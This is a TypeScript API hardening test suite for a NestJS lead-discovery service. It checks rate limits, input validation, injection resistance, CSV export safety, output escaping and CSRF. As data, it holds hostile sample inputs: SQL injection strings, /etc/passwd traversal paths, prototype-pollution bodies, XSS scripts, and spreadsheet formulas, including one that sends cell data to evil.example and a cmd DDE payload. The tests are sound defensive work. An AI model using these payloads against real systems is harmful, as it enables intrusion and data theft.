import supertest from 'supertest';
const request = (supertest as any).default || supertest;
import * as crypto from 'crypto';
import * as jwt from 'jsonwebtoken';
import { INestApplication } from '@nestjs/common';
import { ThrottlerStorage } from '@nestjs/throttler';
import { count, eq } from 'drizzle-orm';
import { TestAppHelper } from './helpers/test-app.helper';
import { TEST_SECRETS } from './helpers/test-secrets';
import * as schema from '../src/database/schema';

/**
 * Phase 7: API abuse prevention. Rate limits (and that they cannot be sidestepped by changing a header or a parameter), bounded
 * pagination, malformed and malicious input, injection, oversized bodies, imports, CSV formula injection, XSS output, CSRF.
 * Each block checks that bad input is refused AND that a valid request is still accepted.
 */
describe('API hardening: rate limits, input validation, injection, uploads, output safety', () => {
  let testApp: TestAppHelper;
  let app: INestApplication;
  const api = () => request(app.getHttpServer());
  const unwrap = (res: any) => res.body.data || res.body;
  const stamp = Date.now();
  let seq = 0;
  const emails: string[] = [];
  const slugs: string[] = [];
  const adminEmail = 'qa.hardening.admin@monarchsoftwares.com';
  const admin = { Authorization: '' };
  const ZERO = '00000000-0000-4000-8000-000000000000';

  const newUser = async (tag: string) => {
    const email = `hard.${tag}.${stamp}.${++seq}@orion-test.io`;
    emails.push(email);
    const res = unwrap(await api().post('/api/v1/auth/register').send({ email, password: 'HardeningPass123!', firstName: 'Ha', lastName: tag }));
    return { id: res.user.id as string, auth: { Authorization: `Bearer ${res.tokens.accessToken}` }, token: res.tokens.accessToken as string };
  };
  const clear = () => (app.get(ThrottlerStorage) as any).storage.clear();
  const statuses = async (n: number, fn: (i: number) => Promise<{ status: number }>) => {
    const out: number[] = [];
    for (let i = 0; i < n; i++) out.push((await fn(i)).status);
    return out;
  };

  beforeAll(async () => {
    testApp = new TestAppHelper();
    app = await testApp.init();
    await testApp.cleanupUsers([adminEmail]);
    const adminId = await testApp.provisionAdmin(adminEmail, 'SUPER_ADMIN');
    admin.Authorization = `Bearer ${jwt.sign({ sub: adminId, email: adminEmail, role: 'SUPER_ADMIN', status: 'ACTIVE' }, TEST_SECRETS.jwtAccess, { expiresIn: '1h', issuer: 'orion-api', audience: 'orion-client' })}`;
  });
  beforeEach(clear);
  afterAll(async () => {
    await testApp.cleanupBusinesses(slugs);
    await testApp.cleanupUsers([...emails, adminEmail]);
    await testApp.close();
  });

  describe('rate limits', () => {
    it('login: the limit holds when the client rotates X-Forwarded-For, the email, or a query parameter', async () => {
      const out = await statuses(14, (i) =>
        api().post(`/api/v1/auth/login?nonce=${i}`).set('X-Forwarded-For', `203.0.113.${i + 1}`).set('X-Real-IP', `198.51.100.${i + 1}`).send({ email: `nobody${i}@orion-test.io`, password: 'wrong-password-1' }),
      );
      expect(out.slice(0, 10).every((s) => s === 401)).toBe(true); // the first 10 are answered normally
      expect(out.slice(10).every((s) => s === 429)).toBe(true); // the 11th onwards is refused whatever the headers say
    });

    it('a refused request says so safely: 429, JSON, no internals', async () => {
      await statuses(10, () => api().post('/api/v1/auth/forgot-password').send({ email: 'x@orion-test.io' }));
      const res = await api().post('/api/v1/auth/forgot-password').send({ email: 'x@orion-test.io' });
      expect(res.status).toBe(429);
      expect(res.headers['content-type']).toMatch(/json/);
      expect(res.body).toMatchObject({ success: false, statusCode: 429, errorCode: 'RATE_LIMITED' });
      expect(JSON.stringify(res.body)).not.toMatch(/stack|node_modules|throttler|SELECT|Exception/i);
    });

    it('admin one-time-code requests are limited per address', async () => {
      const out = await statuses(8, () => api().post('/api/v1/admin/auth/send-otp').send({ email: 'someone@not-allowed.example' }));
      expect(out.slice(0, 5).every((s) => s === 403)).toBe(true); // the domain rule answers first, five times
      expect(out.slice(5).every((s) => s === 429)).toBe(true);
    });

    it('password-reset completion and email verification are limited', async () => {
      const reset = await statuses(8, () => api().post('/api/v1/auth/reset-password').send({ token: 'x'.repeat(40), newPassword: 'AnotherPass123!' }));
      expect(reset.slice(0, 5).every((s) => s === 400)).toBe(true);
      expect(reset.slice(5).every((s) => s === 429)).toBe(true);
      const verify = await statuses(13, () => api().post('/api/v1/auth/verify-email').send({ token: 'y'.repeat(40) }));
      expect(verify.slice(0, 10).every((s) => s === 400)).toBe(true);
      expect(verify.slice(10).every((s) => s === 429)).toBe(true);
    });

    it('lead unlock requests are limited (30 per minute) and a normal request is still served', async () => {
      const u = await newUser('unlock');
      const out = await statuses(34, () => api().post('/api/v1/unlock/business').set(u.auth).send({ businessId: ZERO }));
      expect(out.slice(0, 30).every((s) => s === 404)).toBe(true); // unknown business: the normal answer
      expect(out.slice(30).every((s) => s === 429)).toBe(true);
    });

    it('payment order and verification endpoints are limited', async () => {
      const u = await newUser('pay');
      const out = await statuses(23, () => api().post('/api/v1/payments/create-order').set(u.auth).send({ packageId: 'no-such-package' }));
      expect(out.slice(0, 20).every((s) => s === 400)).toBe(true);
      expect(out.slice(20).every((s) => s === 429)).toBe(true);
    });

    it('bulk saved-lead operations are limited', async () => {
      const u = await newUser('bulk');
      const out = await statuses(13, () => api().post('/api/v1/saved-leads/bulk-delete').set(u.auth).send({ leadIds: [ZERO] }));
      expect(out.slice(0, 10).every((s) => s === 200 || s === 201)).toBe(true);
      expect(out.slice(10).every((s) => s === 429)).toBe(true);
    });

    it('public search is limited (60 per minute), valid searches succeed up to the limit', async () => {
      const out = await statuses(64, (i) => api().get(`/api/v1/discover/search?q=test${i}`)); // a different query each time changes nothing
      expect(out.slice(0, 60).every((s) => s === 200)).toBe(true);
      expect(out.slice(60).every((s) => s === 429)).toBe(true);
    });

    it('exports are limited per user', async () => {
      const u = await newUser('export');
      const out = await statuses(12, () => api().post('/api/v1/exports').set(u.auth).send({ dataset: 'saved-leads', format: 'csv' }));
      expect(out.slice(0, 10).every((s) => s === 200 || s === 201)).toBe(true);
      expect(out.slice(10).every((s) => s === 429)).toBe(true);
    });

    it('limits are independent per route: exhausting one does not lock a different endpoint', async () => {
      const u = await newUser('independent');
      await statuses(12, () => api().post('/api/v1/auth/forgot-password').send({ email: 'z@orion-test.io' }));
      expect((await api().get('/api/v1/credit/wallet').set(u.auth)).status).toBe(200);
    });
  });

  describe('pagination and resource consumption', () => {
    it('history and ledger endpoints cap an excessive limit and survive garbage', async () => {
      const u = await newUser('pages');
      for (const path of ['/api/v1/credit/transactions', '/api/v1/unlock/history']) {
        const big = await api().get(`${path}?limit=1000000000&page=1`).set(u.auth);
        expect(big.status).toBe(200);
        expect(JSON.stringify(big.body)).toMatch(/"limit":100\b/); // the page size actually used is the cap, not a billion
        for (const q of ['limit=abc&page=-3', 'limit=-1', 'page=1e999', 'limit[]=5', 'limit=1.5&page=0', 'limit=&page=']) {
          const res = await api().get(`${path}?${q}`).set(u.auth);
          expect({ path, q, ok: res.status === 200 }).toEqual({ path, q, ok: true });
        }
        expect((await api().get(`${path}?limit=5&page=1`).set(u.auth)).status).toBe(200); // control
      }
    });

    it('search refuses oversized, malformed and over-range parameters, and accepts a normal query', async () => {
      const bad: string[] = [
        `q=${'a'.repeat(5000)}`,
        `q=${'a'.repeat(201)}`,
        'q[]=a&q[]=b',
        `city=${'b'.repeat(101)}`,
        `industryId=${'c'.repeat(65)}`,
        'sortBy=name;DROP%20TABLE%20businesses',
        `sortBy=${'n'.repeat(65)}`,
        'page=100001',
        'page=0',
        'page=abc',
        'limit=101',
        'limit=0',
        'minOrionScore=101',
        'minOrionScore=-1',
        `cursor=${'d'.repeat(501)}`,
      ];
      for (const q of bad) {
        const res = await api().get(`/api/v1/discover/search?${q}`);
        expect({ q: q.slice(0, 40), status: res.status }).toEqual({ q: q.slice(0, 40), status: 400 });
      }
      const ok = await api().get('/api/v1/discover/search?q=tech&city=Bangalore&sortBy=orion_score:desc&page=1&limit=20&hasWebsite=true&minOrionScore=10');
      expect(ok.status).toBe(200);
      expect((await api().get('/api/v1/discover/search?sortBy=newest')).status).toBe(200);
      expect((await api().get('/api/v1/discover/search?sortBy=name_asc&limit=100')).status).toBe(200);
      expect((await api().get(`/api/v1/discover/suggestions?q=${'s'.repeat(101)}`)).status).toBe(400);
      expect((await api().get('/api/v1/discover/suggestions?q=tec')).status).toBe(200);
    });

    it('a request body over the default limit is refused with 413, on ordinary routes and on the payment webhook', async () => {
      const big = JSON.stringify({ email: 'a@orion-test.io', password: 'x'.repeat(300_000) });
      const login = await api().post('/api/v1/auth/login').set('Content-Type', 'application/json').send(big);
      expect(login.status).toBe(413);
      expect(login.body.errorCode).toBe('PAYLOAD_TOO_LARGE');
      const hook = await api().post('/api/v1/payments/webhook').set('Content-Type', 'application/json').set('x-razorpay-signature', 'a'.repeat(64)).send(big);
      expect(hook.status).toBe(413);
    });
  });

  describe('malformed and malicious input is refused before it reaches the database', () => {
    it('NUL bytes (query, body, path) are a 400, not a database error', async () => {
      expect((await api().get('/api/v1/discover/search?q=a%00b')).status).toBe(400);
      expect((await api().get('/api/v1/discover/businesses/ab%00cd')).status).toBe(400);
      const u = await newUser('nul');
      expect((await api().post('/api/v1/saved-searches').set(u.auth).send({ name: 'bad\u0000name', filters: {} })).status).toBe(400);
      expect((await api().post('/api/v1/saved-searches').set(u.auth).send({ name: 'ok', filters: { q: 'x\u0000' } })).status).toBe(400);
      expect((await api().post('/api/v1/saved-searches').set(u.auth).send({ name: 'fine', filters: { q: 'tech' } })).status).toBe(201); // control
    });

    it('prototype-pollution payloads are a 400 and nothing is polluted', async () => {
      const u = await newUser('proto');
      const payloads = [
        '{"name":"x","filters":{"__proto__":{"polluted":"yes"}}}',
        '{"name":"x","filters":{"a":{"__proto__":{"polluted":"yes"}}}}',
        '{"name":"x","filters":{"constructor":{"prototype":{"polluted":"yes"}}}}',
      ];
      for (const body of payloads) {
        const res = await api().post('/api/v1/saved-searches').set(u.auth).set('Content-Type', 'application/json').send(body);
        expect(res.status).toBe(400);
      }
      expect(({} as any).polluted).toBeUndefined();
      expect((Object.prototype as any).polluted).toBeUndefined();
    });

    it('saved-search filters get the same validation as a live search, on save and on run', async () => {
      const u = await newUser('filters');
      expect((await api().post('/api/v1/saved-searches').set(u.auth).send({ name: 's', filters: { q: 'a'.repeat(300) } })).status).toBe(400);
      expect((await api().post('/api/v1/saved-searches').set(u.auth).send({ name: 's', filters: { page: 'abc', limit: 9999 } })).status).toBe(400);
      expect((await api().post('/api/v1/saved-searches').set(u.auth).send({ name: 's', filters: { blob: 'z'.repeat(30_000) } })).status).toBe(400);
      const created = await api().post('/api/v1/saved-searches').set(u.auth).send({ name: 'valid', filters: { q: 'tech', city: 'Pune', customUiKey: 'kept' } });
      expect(created.status).toBe(201); // an unknown key is allowed: no existing filter is dropped
      const id = unwrap(created).id;
      expect((await api().post(`/api/v1/saved-searches/${id}/run`).set(u.auth)).status).toBe(200);
      // a stored value that is no longer valid cannot be run
      await testApp.db.update(schema.savedSearches).set({ filters: { q: 'a'.repeat(500) } }).where(eq(schema.savedSearches.id, id));
      const run = await api().post(`/api/v1/saved-searches/${id}/run`).set(u.auth);
      expect(run.status).toBe(400);
      expect(JSON.stringify(run.body)).toContain('INVALID_SAVED_FILTERS');
    });

    it('SQL injection strings are plain text: no error, no extra rows, no unpublished data, tables intact', async () => {
      const slug = `hard-inj-${stamp}`;
      slugs.push(slug);
      await testApp.createTestBusiness({ slug, name: `Injection Probe Co ${stamp}`, contactEmail: `${slug}@lead.example`, contactPhone: '+91 9000000009' });
      const draft = await testApp.createTestBusiness({ slug: `${slug}-draft`, name: `Hidden Draft Co ${stamp}`, contactEmail: `${slug}-d@lead.example`, contactPhone: '+91 9000000008' });
      slugs.push(`${slug}-draft`);
      await testApp.db.update(schema.businesses).set({ status: 'DRAFT' }).where(eq(schema.businesses.id, draft.id));

      const [{ n: before }] = await testApp.db.select({ n: count() }).from(schema.businesses);
      const total = async (qs: string, accept: number[] = [200]) => {
        const res = await api().get(`/api/v1/discover/search?${qs}`);
        // 200 (treated as plain text), or 400 where a length limit refuses it first (the pincode cap is 20): never a 500
        expect({ qs: qs.slice(0, 50), ok: accept.includes(res.status) }).toEqual({ qs: qs.slice(0, 50), ok: true });
        const body = unwrap(res);
        return { res, hits: JSON.stringify(res.body), status: res.status, n: Number(body.pagination?.totalItems ?? body.total ?? 0) };
      };
      const baseline = await total('limit=100');
      const payloads = ["' OR '1'='1", "'; DROP TABLE businesses; --", "%' OR 1=1 --", '" OR ""="', '1; SELECT pg_sleep(5)', '\\', "' UNION SELECT NULL,NULL--", '%', '_'];
      let refused = 0;
      let accepted = 0;
      for (const p of payloads) {
        for (const field of ['q', 'city', 'state', 'pincode', 'district']) {
          const r = await total(`${field}=${encodeURIComponent(p)}&limit=100`, [200, 400]);
          if (r.status === 400) {
            refused++;
            continue;
          }
          accepted++;
          expect(r.hits).not.toContain('Hidden Draft Co');
          expect(r.n).toBeLessThanOrEqual(baseline.n); // never more than the unfiltered set
          if (p.includes("' OR '1'='1") || p.includes('OR 1=1')) expect(r.n).toBeLessThan(Math.max(baseline.n, 1)); // a tautology must not return everything
        }
      }
      expect(accepted).toBeGreaterThan(30); // most payloads really reached the query as text
      expect(refused).toBeGreaterThan(0); // and the over-long ones for short fields were refused by validation
      const [{ n: after }] = await testApp.db.select({ n: count() }).from(schema.businesses);
      expect(after).toBe(before); // DROP / injected writes had no effect
      expect(JSON.stringify((await total(`q=${encodeURIComponent('Injection Probe')}`)).res.body)).toContain('Injection Probe Co');
    });

    it('path traversal and encoded separators in identifiers are refused', async () => {
      for (const p of ['..%2f..%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2fsecret', '....//....//x', '..\\..\\windows', '/etc/passwd']) {
        for (const base of ['/api/v1/discover/businesses/', '/api/v1/businesses/', '/api/v1/exports/']) {
          const res = await api().get(`${base}${p}`);
          expect({ base, p, ok: [400, 401, 404].includes(res.status) }).toEqual({ base, p, ok: true });
          expect(JSON.stringify(res.body)).not.toMatch(/root:|\[boot loader\]/);
        }
      }
    });

    it('free-form bodies cannot smuggle ownership or unexpected shapes (arrays instead of objects, wrong types)', async () => {
      const u = await newUser('shapes');
      for (const body of [[], 'text', 5, { name: ['a'], filters: {} }, { name: 'x', filters: [] }, { name: 'x', filters: 'str' }, { name: 'x', filters: {}, userId: ZERO }]) {
        const res = await api().post('/api/v1/saved-searches').set(u.auth).set('Content-Type', 'application/json').send(JSON.stringify(body));
        expect({ body, status: res.status }).toEqual({ body, status: 400 });
      }
    });
  });

  describe('imports and exports', () => {
    const preview = (csv: unknown) => api().post('/api/v1/admin/import/csv/preview').set(admin).send({ csv });

    it('a valid CSV is accepted (control), including a quoted multi-line field', async () => {
      const template = (await api().get('/api/v1/admin/import/template')).text;
      expect(template.length).toBeGreaterThan(50);
      const res = await preview(template);
      expect(res.status).toBe(200);
      const quoted = await preview('business_name,city\n"Quoted, Name\nLine Two",Pune\n');
      expect(quoted.status).toBe(200);
    });

    it('malformed CSV, wrong types, empty input and limit breaches are refused cleanly, never a 500', async () => {
      const tooManyRows = `business_name\n${Array.from({ length: 5001 }, (_, i) => `Co ${i}`).join('\n')}\n`;
      const tooManyColumns = `${Array.from({ length: 201 }, (_, i) => `c${i}`).join(',')}\n${Array.from({ length: 201 }, () => 'v').join(',')}\n`;
      const cases: Array<[string, unknown]> = [
        ['unclosed quote', 'business_name,city\n"Unclosed,Pune\n'],
        ['binary garbage', Buffer.from([0, 255, 254, 1, 2, 3, 4]).toString('latin1')],
        ['NUL byte', 'business_name\nA\u0000B\n'],
        ['not a string', { csv: 'x' }],
        ['number', 12345],
        ['array', ['a', 'b']],
        ['empty', ''],
        ['null', null],
        ['too many rows', tooManyRows],
        ['too many columns', tooManyColumns],
        ['cell too long', `business_name\n${'x'.repeat(6000)}\n`],
        ['column name too long', `${'n'.repeat(250)}\nv\n`],
      ];
      for (const [label, csv] of cases) {
        const res = await preview(csv);
        expect({ label, status: res.status, refused: res.status === 400 || (res.status === 200 && JSON.stringify(unwrap(res)).length > 0) }).toEqual({ label, status: res.status, refused: true });
        expect({ label, notServerError: res.status < 500 }).toEqual({ label, notServerError: true });
      }
      for (const label of ['too many rows', 'too many columns', 'cell too long', 'column name too long', 'NUL byte', 'not a string', 'null', 'empty']) {
        const csv = cases.find((c) => c[0] === label)![1];
        expect({ label, status: (await preview(csv)).status }).toEqual({ label, status: 400 });
      }
    });

    it('imports need an administrator: a customer and an anonymous caller are refused before the body is read', async () => {
      const u = await newUser('importer');
      expect((await api().post('/api/v1/admin/import/csv/preview').set(u.auth).send({ csv: 'business_name\nA\n' })).status).toBe(403);
      expect((await api().post('/api/v1/admin/import/csv/preview').send({ csv: 'business_name\nA\n' })).status).toBe(401);
    });

    it('CSV export neutralises spreadsheet formulas in customer-entered text', async () => {
      const u = await newUser('formula');
      const slug = `hard-formula-${stamp}`;
      slugs.push(slug);
      const biz = await testApp.createTestBusiness({ slug, name: `Formula Co ${stamp}`, contactEmail: `${slug}@lead.example`, contactPhone: '+91 9000000007' });
      const attacks = ['=HYPERLINK("http://evil.example/?x="&A1,"click")', '+cmd|\' /C calc\'!A0', '-2+3', '@SUM(1+1)', '\t=1+1', '\r=1+1'];
      let i = 0;
      for (const attack of attacks) {
        const b = i === 0 ? biz : await testApp.createTestBusiness({ slug: `${slug}-${i}`, name: `Formula Co ${stamp} ${i}`, contactEmail: `${slug}-${i}@lead.example`, contactPhone: '+91 9000000006' });
        if (i > 0) slugs.push(`${slug}-${i}`);
        await testApp.db.insert(schema.savedLeads).values({ userId: u.id, businessId: b.id, notes: attack, pipelineStage: 'NEW', tags: [] });
        i++;
      }
      clear();
      const exp = await api().post('/api/v1/exports').set(u.auth).send({ dataset: 'saved-leads', format: 'csv' });
      expect([200, 201]).toContain(exp.status);
      const csv = String(exp.text);
      expect(csv).toContain('HYPERLINK'); // the data is there ...
      for (const cell of csv.split(/\r?\n/).flatMap((line) => line.split(','))) {
        const c = cell.replace(/^"|"$/g, '');
        expect({ cell: c.slice(0, 30), dangerous: /^[=+\-@\t\r]/.test(c) }).toEqual({ cell: c.slice(0, 30), dangerous: false }); // ... but no cell starts with a formula character
      }
    });
  });

  describe('output safety', () => {
    it('stored markup is returned as JSON text, never as HTML', async () => {
      const u = await newUser('xss');
      const payload = '<script>alert(1)</script><img src=x onerror=alert(2)>';
      const res = await api().post('/api/v1/saved-searches').set(u.auth).send({ name: payload, filters: {} });
      expect(res.status).toBe(201);
      expect(res.headers['content-type']).toMatch(/application\/json/);
      const list = await api().get('/api/v1/saved-searches').set(u.auth);
      expect(list.headers['content-type']).toMatch(/application\/json/);
      expect(JSON.stringify(unwrap(list))).toContain('alert(1)'); // stored as given: encoding is the renderer's job, and JSON is not rendered
    });

    it('the printable invoice escapes customer-influenced text', async () => {
      const u = await newUser('invoice');
      const xss = '<img src=x onerror=alert(1)><script>steal()</script>';
      const [inv] = await testApp.db
        .insert(schema.invoices)
        .values({ invoiceNumber: `INV-HX-${stamp}`, userId: u.id, paymentId: `pay_hx_${stamp}`, kind: 'TOPUP', description: xss, credits: 1, subtotalPaise: 100, totalPaise: 100 } as any)
        .returning();
      const html = await api().get(`/api/v1/billing/invoices/${inv.id}/html`).set(u.auth);
      expect(html.status).toBe(200);
      expect(html.text).not.toContain('<script>steal()</script>');
      expect(html.text).not.toContain('<img src=x onerror');
      expect(html.text).toContain('&lt;');
    });

    it('errors never carry stack traces, SQL or file paths', async () => {
      const u = await newUser('errors');
      // issued one after another (each is built only when it is its turn)
      const probes = [
        () => api().get('/api/v1/discover/businesses/not-a-valid-slug-%27%22'),
        () => api().get('/api/v1/exports/not-a-uuid/download').set(u.auth),
        () => api().post('/api/v1/unlock/business').set(u.auth).send({ businessId: 'not-a-uuid' }),
        () => api().post('/api/v1/auth/login').set('Content-Type', 'application/json').send('{broken json'),
      ];
      for (const probe of probes) {
        const res = await probe();
        expect(res.status).toBeLessThan(500);
        expect(JSON.stringify(res.body)).not.toMatch(/\bat\s+\S+\s+\(|node_modules|\.ts:\d+|SELECT |INSERT |relation "|pg_|stack/i);
      }
    });
  });

  describe('CSRF: the API does not use ambient credentials', () => {
    it('a valid session token in a cookie is ignored; only the Authorization header authenticates', async () => {
      const u = await newUser('csrf');
      for (const name of ['orion_access_token', 'access_token', 'token', 'jwt', 'orion_admin_token']) {
        const read = await api().get('/api/v1/credit/wallet').set('Cookie', `${name}=${u.token}`);
        expect({ name, status: read.status }).toEqual({ name, status: 401 });
        const write = await api().post('/api/v1/saved-searches').set('Cookie', `${name}=${u.token}`).send({ name: 'forged', filters: {} });
        expect({ name, status: write.status }).toEqual({ name, status: 401 });
      }
      expect((await api().get('/api/v1/credit/wallet').set(u.auth)).status).toBe(200); // control
      const list = unwrap(await api().get('/api/v1/saved-searches').set(u.auth));
      expect(JSON.stringify(list)).not.toContain('forged');
    });
  });

  describe('webhook input', () => {
    it('a correctly signed but malformed or irrelevant body is ignored without an error', async () => {
      const post = (raw: string) => api().post('/api/v1/payments/webhook').set('Content-Type', 'application/json').set('x-razorpay-signature', crypto.createHmac('sha256', TEST_SECRETS.razorpayWebhookSecret).update(raw).digest('hex')).send(raw);
      for (const raw of ['[]', '{}', '{"event":"payment.captured"}', '{"event":"payment.captured","payload":{"payment":{"entity":{"id":12345}}}}', '{"event":{"$ne":1}}']) {
        const res = await post(raw);
        expect({ raw: raw.slice(0, 30), status: res.status }).toEqual({ raw: raw.slice(0, 30), status: 200 });
        expect(JSON.stringify(res.body)).not.toMatch(/stack|SELECT|at\s+\S+\s+\(/i);
      }
      // text that is not JSON never reaches the handler: the body parser refuses it as a client error, not a server fault
      const notJson = await post('not json at all');
      expect(notJson.status).toBe(400);
      expect(JSON.stringify(notJson.body)).not.toMatch(/stack|SyntaxError|Unexpected token/i);
    });
  });
});
